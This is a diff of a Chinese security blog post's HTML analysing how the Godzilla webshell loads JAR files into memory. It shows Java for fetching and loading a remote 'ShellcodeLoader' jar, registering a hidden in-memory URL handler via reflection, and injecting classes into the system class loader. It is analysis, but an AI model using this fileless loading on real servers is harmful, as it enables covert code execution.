@@ -10,13 +10,12 @@
     <title>分析哥斯拉内存加载Jar技术 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="分析哥斯拉内存加载Jar技术" />
 <meta property="og:description" content="1 背景哥斯拉在第一版的时候就提供了一个黑魔法：内存加载Jar功能。从当时的介绍来看，这个功能本来是为上传数据库驱动用的，后面配合JNA可以实" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/memory-jarloader/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/memory-jarloader/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-10-09T20:25:03+08:00" />
 <meta property="article:modified_time" content="2023-10-09T20:25:03+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="分析哥斯拉内存加载Jar技术"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="分析哥斯拉内存加载Jar技术"/>
 <meta name="twitter:description" content="1 背景哥斯拉在第一版的时候就提供了一个黑魔法：内存加载Jar功能。从当时的介绍来看，这个功能本来是为上传数据库驱动用的，后面配合JNA可以实"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -235,8 +234,8 @@ sun.misc.URLClassPath类和java.net.URL类在Java中都与URL（统一资源定�
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">URLClassLoader loader = new URLClassLoader(new URL[]{new URL(&#34;http://yzddmr6.com/exp.jar&#34;)});
-</span></span><span class="line"><span class="cl">loader.loadClass(&#34;asexploits.ShellcodeLoader&#34;);
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">URLClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">new</span> <span class="n">URLClassLoader</span><span class="p">(</span><span class="n">new</span> <span class="n">URL</span><span class="p">[]{</span><span class="n">new</span> <span class="n">URL</span><span class="p">(</span><span class="s2">&#34;http://yzddmr6.com/exp.jar&#34;</span><span class="p">)});</span>
+</span></span><span class="line"><span class="cl"><span class="n">loader</span><span class="o">.</span><span class="n">loadClass</span><span class="p">(</span><span class="s2">&#34;asexploits.ShellcodeLoader&#34;</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>为了摸清这一过程，我们用上面的代码对http协议加载Jar包过程进行调试：
@@ -368,32 +367,32 @@ sun.misc.URLClassPath.JarLoader#getJarFile(java.net.URL)
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Field declaredField = null;
-</span></span><span class="line"><span class="cl">files = new ArrayList();
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Field</span> <span class="n">declaredField</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ArrayList</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">try {
-</span></span><span class="line"><span class="cl">    declaredField = URL.class.getDeclaredField(&#34;handlers&#34;);
-</span></span><span class="line"><span class="cl">} catch (NoSuchFieldException var7) {
-</span></span><span class="line"><span class="cl">    try {
-</span></span><span class="line"><span class="cl">        declaredField = URL.class.getDeclaredField(&#34;ph_cache&#34;);
-</span></span><span class="line"><span class="cl">    } catch (NoSuchFieldException var5) {
-</span></span><span class="line"><span class="cl">    } catch (Exception var6) {
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl"><span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">declaredField</span> <span class="o">=</span> <span class="n">URL</span><span class="o">.</span><span class="k">class</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;handlers&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">NoSuchFieldException</span> <span class="n">var7</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">declaredField</span> <span class="o">=</span> <span class="n">URL</span><span class="o">.</span><span class="k">class</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;ph_cache&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">NoSuchFieldException</span> <span class="n">var5</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">var6</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">declaredField.setAccessible(true);
-</span></span><span class="line"><span class="cl">Map map = (Map) declaredField.get(null);
-</span></span><span class="line"><span class="cl">synchronized (map) {
-</span></span><span class="line"><span class="cl">    Object memoryBufferURLStreamHandler;
-</span></span><span class="line"><span class="cl">    if (map.containsKey(&#34;jarmembuff&#34;)) {
-</span></span><span class="line"><span class="cl">        memoryBufferURLStreamHandler = map.get(&#34;jarmembuff&#34;);
-</span></span><span class="line"><span class="cl">    } else {
-</span></span><span class="line"><span class="cl">        memoryBufferURLStreamHandler = new MemoryBufferURLStreamHandler();
-</span></span><span class="line"><span class="cl">        map.put(&#34;jarmembuff&#34;, memoryBufferURLStreamHandler);
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl"><span class="n">declaredField</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Map</span> <span class="n">map</span> <span class="o">=</span> <span class="p">(</span><span class="n">Map</span><span class="p">)</span> <span class="n">declaredField</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">synchronized</span> <span class="p">(</span><span class="n">map</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">Object</span> <span class="n">memoryBufferURLStreamHandler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">map</span><span class="o">.</span><span class="n">containsKey</span><span class="p">(</span><span class="s2">&#34;jarmembuff&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">memoryBufferURLStreamHandler</span> <span class="o">=</span> <span class="n">map</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;jarmembuff&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">memoryBufferURLStreamHandler</span> <span class="o">=</span> <span class="n">new</span> <span class="n">MemoryBufferURLStreamHandler</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">map</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&#34;jarmembuff&#34;</span><span class="p">,</span> <span class="n">memoryBufferURLStreamHandler</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    files = (List) memoryBufferURLStreamHandler.getClass().getMethod(&#34;getFiles&#34;).invoke(memoryBufferURLStreamHandler);
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">(</span><span class="n">List</span><span class="p">)</span> <span class="n">memoryBufferURLStreamHandler</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;getFiles&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">memoryBufferURLStreamHandler</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="实现自定义urlstreamhandler" class="headerLink">
@@ -423,27 +422,27 @@ sun.misc.URLClassPath.JarLoader#getJarFile(java.net.URL)
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import java.io.IOException;
-</span></span><span class="line"><span class="cl">import java.net.URL;
-</span></span><span class="line"><span class="cl">import java.net.URLConnection;
-</span></span><span class="line"><span class="cl">import java.net.URLStreamHandler;
-</span></span><span class="line"><span class="cl">import java.util.ArrayList;
-</span></span><span class="line"><span class="cl">import java.util.List;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">IOException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">URL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">URLConnection</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">URLStreamHandler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">ArrayList</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">List</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">public class MemoryBufferURLStreamHandler extends URLStreamHandler {
-</span></span><span class="line"><span class="cl">    private final List files = new ArrayList();
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">class</span> <span class="n">MemoryBufferURLStreamHandler</span> <span class="k">extends</span> <span class="n">URLStreamHandler</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">private</span> <span class="n">final</span> <span class="n">List</span> <span class="n">files</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ArrayList</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public MemoryBufferURLStreamHandler() {
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">MemoryBufferURLStreamHandler</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public List getFiles() {
-</span></span><span class="line"><span class="cl">        return this.files;
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">List</span> <span class="n">getFiles</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">files</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public URLConnection openConnection(URL url) throws IOException {
-</span></span><span class="line"><span class="cl">        return new MemoryBufferURLConnection(url);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">URLConnection</span> <span class="n">openConnection</span><span class="p">(</span><span class="n">URL</span> <span class="n">url</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">new</span> <span class="n">MemoryBufferURLConnection</span><span class="p">(</span><span class="n">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="实现自定义urlconnection" class="headerLink">
@@ -502,56 +501,56 @@ sun.misc.URLClassPath.JarLoader#getJarFile(java.net.URL)
 </span><span class="lnt">50
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import java.io.ByteArrayInputStream;
-</span></span><span class="line"><span class="cl">import java.io.IOException;
-</span></span><span class="line"><span class="cl">import java.io.InputStream;
-</span></span><span class="line"><span class="cl">import java.lang.reflect.Field;
-</span></span><span class="line"><span class="cl">import java.net.MalformedURLException;
-</span></span><span class="line"><span class="cl">import java.net.URL;
-</span></span><span class="line"><span class="cl">import java.net.URLConnection;
-</span></span><span class="line"><span class="cl">import java.util.ArrayList;
-</span></span><span class="line"><span class="cl">import java.util.List;
-</span></span><span class="line"><span class="cl">import java.util.Map;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">ByteArrayInputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">IOException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">InputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Field</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">MalformedURLException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">URL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">URLConnection</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">ArrayList</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">List</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">Map</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">public class MemoryBufferURLConnection extends URLConnection {
-</span></span><span class="line"><span class="cl">    private static List files;
-</span></span><span class="line"><span class="cl">    private final String contentType;
-</span></span><span class="line"><span class="cl">    private final byte[] data;
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">class</span> <span class="n">MemoryBufferURLConnection</span> <span class="k">extends</span> <span class="n">URLConnection</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">private</span> <span class="k">static</span> <span class="n">List</span> <span class="n">files</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">private</span> <span class="n">final</span> <span class="ne">String</span> <span class="n">contentType</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">private</span> <span class="n">final</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">data</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    protected MemoryBufferURLConnection(URL url) {
-</span></span><span class="line"><span class="cl">        super(url);
-</span></span><span class="line"><span class="cl">        String file = url.getFile();
-</span></span><span class="line"><span class="cl">        int indexOf = file.indexOf(47);
-</span></span><span class="line"><span class="cl">        synchronized (files) {
-</span></span><span class="line"><span class="cl">            this.data = (byte[]) files.get(Integer.parseInt(file.substring(0, indexOf)));
-</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    <span class="n">protected</span> <span class="n">MemoryBufferURLConnection</span><span class="p">(</span><span class="n">URL</span> <span class="n">url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">super</span><span class="p">(</span><span class="n">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="ne">String</span> <span class="n">file</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">getFile</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="ne">int</span> <span class="n">indexOf</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="mi">47</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">synchronized</span> <span class="p">(</span><span class="n">files</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">this</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">[])</span> <span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">Integer</span><span class="o">.</span><span class="n">parseInt</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">indexOf</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        this.contentType = file.substring(indexOf + 1);
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">contentType</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">substring</span><span class="p">(</span><span class="n">indexOf</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public static URL createURL(byte[] bArr, String str) throws MalformedURLException {
-</span></span><span class="line"><span class="cl">        synchronized (files) {
-</span></span><span class="line"><span class="cl">            files.add(bArr);
-</span></span><span class="line"><span class="cl">            URL url = new URL(&#34;jarmembuff&#34;, &#34;&#34;, files.size() - 1 + &#34;/&#34; + str);
-</span></span><span class="line"><span class="cl">            return url;
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="k">static</span> <span class="n">URL</span> <span class="n">createURL</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">bArr</span><span class="p">,</span> <span class="ne">String</span> <span class="nb">str</span><span class="p">)</span> <span class="n">throws</span> <span class="n">MalformedURLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">synchronized</span> <span class="p">(</span><span class="n">files</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">bArr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="n">new</span> <span class="n">URL</span><span class="p">(</span><span class="s2">&#34;jarmembuff&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">.</span><span class="n">size</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public void connect() throws IOException {
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">connect</span><span class="p">()</span> <span class="n">throws</span> <span class="n">IOException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public int getContentLength() {
-</span></span><span class="line"><span class="cl">        return this.data.length;
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="ne">int</span> <span class="n">getContentLength</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public String getContentType() {
-</span></span><span class="line"><span class="cl">        return this.contentType;
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="ne">String</span> <span class="n">getContentType</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">contentType</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public InputStream getInputStream() throws IOException {
-</span></span><span class="line"><span class="cl">        return new ByteArrayInputStream(this.data); // 直接返回内存中的内容
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">InputStream</span> <span class="n">getInputStream</span><span class="p">()</span> <span class="n">throws</span> <span class="n">IOException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">data</span><span class="p">);</span> <span class="o">//</span> <span class="err">直接返回内存中的内容</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="添加到systemclassloader的ucp中" class="headerLink">
@@ -580,26 +579,26 @@ sun.misc.URLClassPath.JarLoader#getJarFile(java.net.URL)
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public String load(byte[] jarClassData) {
-</span></span><span class="line"><span class="cl">    Class URLConnectionClass = null;
-</span></span><span class="line"><span class="cl">    try {
-</span></span><span class="line"><span class="cl">        String MemoryBufferURLConnection = &#34;&#34;;
-</span></span><span class="line"><span class="cl">        String MemoryBufferURLStreamHandler = &#34;&#34;;
-</span></span><span class="line"><span class="cl">        defClz(Base64DecodeToByte(MemoryBufferURLStreamHandler));
-</span></span><span class="line"><span class="cl">        URLConnectionClass = defClz(Base64DecodeToByte(MemoryBufferURLConnection));
-</span></span><span class="line"><span class="cl">    } catch (Exception e) {
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">public</span> <span class="ne">String</span> <span class="nb">load</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">jarClassData</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Class</span> <span class="n">URLConnectionClass</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="ne">String</span> <span class="n">MemoryBufferURLConnection</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="ne">String</span> <span class="n">MemoryBufferURLStreamHandler</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">defClz</span><span class="p">(</span><span class="n">Base64DecodeToByte</span><span class="p">(</span><span class="n">MemoryBufferURLStreamHandler</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">URLConnectionClass</span> <span class="o">=</span> <span class="n">defClz</span><span class="p">(</span><span class="n">Base64DecodeToByte</span><span class="p">(</span><span class="n">MemoryBufferURLConnection</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    if (jarClassData != null) {
-</span></span><span class="line"><span class="cl">        try {
-</span></span><span class="line"><span class="cl">            return addJar((URL) URLConnectionClass.getMethod(&#34;createURL&#34;, byte[].class, String.class).invoke(null, jarClassData, &#34;application/jar&#34;));
-</span></span><span class="line"><span class="cl">        } catch (Exception e) {
-</span></span><span class="line"><span class="cl">            return e.getMessage();
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">    } else {
-</span></span><span class="line"><span class="cl">        return &#34;jarByteArray is null&#34;;
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">jarClassData</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">addJar</span><span class="p">((</span><span class="n">URL</span><span class="p">)</span> <span class="n">URLConnectionClass</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;createURL&#34;</span><span class="p">,</span> <span class="n">byte</span><span class="p">[]</span><span class="o">.</span><span class="k">class</span><span class="p">,</span> <span class="ne">String</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">null</span><span class="p">,</span> <span class="n">jarClassData</span><span class="p">,</span> <span class="s2">&#34;application/jar&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">e</span><span class="o">.</span><span class="n">getMessage</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;jarByteArray is null&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="files对象" class="headerLink">
